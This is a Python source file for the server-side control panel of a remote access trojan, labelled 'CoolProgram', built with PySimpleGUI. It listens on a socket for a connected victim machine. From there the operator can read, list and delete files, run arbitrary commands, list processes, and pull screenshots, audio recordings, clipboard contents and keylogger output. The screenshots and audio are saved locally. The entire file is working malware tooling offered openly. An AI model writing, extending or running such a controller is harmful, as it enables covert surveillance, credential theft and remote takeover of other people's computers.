import PySimpleGUI as gui
from PySimpleGUI.PySimpleGUI import main

import socket, ast

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_ip = '192.168.0.4'
# server_ip = socket.gethostbyname(socket.gethostname())

main_layout = [
    [gui.Text("Welcome to CoolProgram!", key="text")],
    [gui.Button("Open connection")],
    [gui.Button("List Root Directory")],
    [gui.Button("Get File Content")],
    [gui.Button("List Directory")],
    [gui.Button("Get System Info")],
    [gui.Button("Delete File")],
    [gui.Button("List Processes")],
    [gui.Button("Excecute Command")],
    [gui.Button("Capture Screen")],
    [gui.Button("Capture Audio")],
    [gui.Button("Capture Clipboard")],
    [gui.Button("Keylogger")],
    [gui.Multiline(f"{server_ip}", key="status", size=(120,20))]]

main_window = gui.Window(title="coolProgram", layout=main_layout, margins=(10,10))


def Recv():
    res = b''
    size = int(client.recv(128).decode())
    print(size)
    client.send('ok'.encode())
    rcv = 0
    while size > rcv:
        pack = client.recv(1024)
        res += pack
        rcv += 1024
        print(rcv)
    client.send('ok'.encode())
    
    return res

while True:
    event, values = main_window.read()
    print("waiting for activity")

    if event == "Open connection":
        server.bind(('192.168.0.4', 11111))
        server.listen(100)
        client, client_ip = server.accept()
        print("accepted..")
        main_window["status"].print(f"\nConnected:{client_ip}")

    if event == "List Root Directory":
        print('lrd')
        command = 'lrd'
        client.send(command.encode())
        reply = client.recv(1024).decode()
        print(reply)
        if reply == "ok":
            result = client.recv(1024).decode()
            print(result)
            main_window["status"].print(f"\n{result}")
        else:
            main_window["status"].print(f"\nsmth went wrong")    

    if event == "Get File Content":
        print('gfc')
        command = 'gfc'
        client.send(command.encode())
        path = gui.popup_get_text('Insert desired file path:')
        client.send(path.encode())
        reply = client.recv(1024).decode()
        print(reply)
        if reply == "ok":
            result = Recv().decode()
            print(result)
            main_window["status"].print(f"\n{result}")
        else:
            main_window["status"].print(f"\nsmth went wrong")
    
    if event == "List Directory":
        command = 'ld'
        client.send(command.encode())
        path = gui.popup_get_text('Insert desired directory path:')
        client.send(path.encode())
        reply = client.recv(1024).decode()
        print(reply)
        if reply == "ok":
            result = client.recv(1024).decode()
            print(result)
            main_window["status"].print(f"\n{result}")
        else:
            main_window["status"].print(f"\nsmth went wrong")

    if event == "Get System Info":
        command = 'gsi'
        client.send(command.encode())
        reply = client.recv(1024).decode()
        print(reply)
        if reply == "ok":
            result = client.recv(1024).decode().split('-')
            print(result)
            main_window["status"].print(f"\n{result}")
        else:
            main_window["status"].print(f"\nsmth went wrong")

    if event == "Delete File":
        command = 'df'
        client.send(command.encode())
        path = gui.popup_get_text('Insert desired file path:')
        client.send(path.encode())
        reply = client.recv(1024).decode()
        print(reply)
        if reply == "ok":
            result = client.recv(1024).decode()
            print(result)
            main_window["status"].print(f"\n{result}")
        else:
            main_window["status"].print(f"\nsmth went wrong")

    if event == "List Processes":
        command = 'lp'
        client.send(command.encode())
        reply = client.recv(1024).decode()
        print(reply)
        if reply == "ok":
            result = Recv().decode()
            result = "\n\t".join(result.split("+"))
            print(result)
            main_window["status"].print(f"\n{result}")
        else:
            main_window["status"].print(f"\nsmth went wrong")
    
    if event == "Excecute Command":
        command = 'exc'
        client.send(command.encode())
        com = gui.popup_get_text('Insert desired command to execute:')
        client.send(com.encode())
        reply = client.recv(1024).decode()
        print(reply)
        if reply == "ok":
            result = client.recv(1024).decode()
            print(result)
            main_window["status"].print(f"\n{result}")
        else:
            main_window["status"].print(f"\nsmth went wrong")
    
    if event == "Capture Screen":
        command = 'cs'
        client.send(command.encode())
        reply = client.recv(1024).decode()
        if reply == "ok":

            scr = Recv()
            name = 'screenshot.png'

            bt = scr
            with open(name, 'wb') as file:
                file.write(bt)
            main_window["status"].print(f"\nScreenshot saved.")
        else:
            main_window["status"].print(f"\nsmth went wrong")
    
    if event == "Capture Audio":
        command = 'ca'
        client.send(command.encode())
        reply = client.recv(1024).decode()
        if reply == "ok":

            snd = Recv()
            name = 'soundcap.wav'

            bt = snd
            with open(name, 'wb') as file:
                file.write(bt)
            main_window["status"].print(f"\Soundcap saved.")
        else:
            main_window["status"].print(f"\nsmth went wrong")
    
    if event == "Capture Clipboard":
        command = 'cc'
        client.send(command.encode())
        reply = client.recv(1024).decode()
        if reply == "ok":
            res = Recv().decode()
            print(res)
            main_window["status"].print(f"\n{res}")
        else:
            main_window["status"].print(f"\nsmth went wrong")

        

    if event == "Keylogger":
        command = 'kl'
        client.send(command.encode())
        reply = client.recv(1024).decode()
        print(reply)
        if reply == "ok":
            result = Recv().decode()
            print(result)
            main_window["status"].print(f"\n{result}")
        else:
            main_window["status"].print(f"\nsmth went wrong")
        
    

    elif event == gui.WIN_CLOSED:
        break

main_window.close()